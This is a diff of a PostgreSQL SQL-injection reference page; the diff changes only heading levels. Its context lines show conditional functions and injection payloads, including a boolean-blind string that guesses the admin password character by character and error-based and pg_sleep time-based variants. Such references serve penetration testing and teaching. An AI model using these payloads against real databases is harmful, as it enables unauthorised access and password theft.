@@ -7,11 +7,9 @@ tags: ["conditional", "case", "boolean"]
 lastUpdated: 2025-12-07
 ---
 
-## Conditional Statements
-
 Conditional logic is essential for advanced SQL injection techniques, particularly for boolean-based and time-based blind injection.
 
-### CASE Expression
+## CASE Expression
 
 The primary conditional construct in PostgreSQL:
 
@@ -34,7 +32,7 @@ SELECT CASE
 END;
 ```
 
-### Boolean Type
+## Boolean Type
 
 PostgreSQL has a native boolean type:
 
@@ -50,7 +48,7 @@ SELECT 1::boolean;      -- true
 SELECT 0::boolean;      -- false
 ```
 
-### COALESCE() Function
+## COALESCE() Function
 
 Returns the first non-NULL value:
 
@@ -61,7 +59,7 @@ SELECT COALESCE(NULL, NULL, 'default');
 SELECT COALESCE(username, 'anonymous') FROM users;
 ```
 
-### NULLIF() Function
+## NULLIF() Function
 
 Returns NULL if two values are equal:
 
@@ -70,16 +68,16 @@ SELECT NULLIF(1, 1);  -- NULL
 SELECT NULLIF(1, 2);  -- 1
 ```
 
-### GREATEST() and LEAST() Functions
+## GREATEST() and LEAST() Functions
 
 ```sql
 SELECT GREATEST(1, 2, 3);  -- 3
 SELECT LEAST(1, 2, 3);     -- 1
 ```
 
-### Injection Examples
+## Injection Examples
 
-#### Boolean-Based Blind Injection
+### Boolean-Based Blind Injection
 
 ```sql
 -- Test if first character of database name is 'p'
@@ -92,7 +90,7 @@ SELECT LEAST(1, 2, 3);     -- 1
 ' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN true ELSE false END FROM users WHERE username='admin')--
 ```
 
-#### Conditional Error-Based
+### Conditional Error-Based
 
 ```sql
 -- Force error when condition is true
@@ -102,7 +100,7 @@ SELECT LEAST(1, 2, 3);     -- 1
 ' AND CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN CAST(1/0 AS text) ELSE NULL END--
 ```
 
-#### Conditional Time-Based
+### Conditional Time-Based
 
 ```sql
 -- Sleep when condition is true
@@ -114,7 +112,7 @@ SELECT LEAST(1, 2, 3);     -- 1
 
 **Note:** `pg_sleep()` returns void, not a boolean. The CASE expression exploits the function's side-effect (the delay) rather than any return value. The condition determines which branch executes, and the observable delay reveals whether the condition was true or false.
 
-### Comparing Values
+## Comparing Values
 
 ```sql
 -- String comparison (case-sensitive)
@@ -126,7 +124,7 @@ SELECT CASE WHEN LOWER('Admin') = 'admin' THEN 'match' ELSE 'no match' END;
 -- Result: 'match'
 ```
 
-### Notes
+## Notes
 
 - PostgreSQL uses `CASE WHEN` (not `IF()` like MySQL)
 - Boolean operations are native and efficient
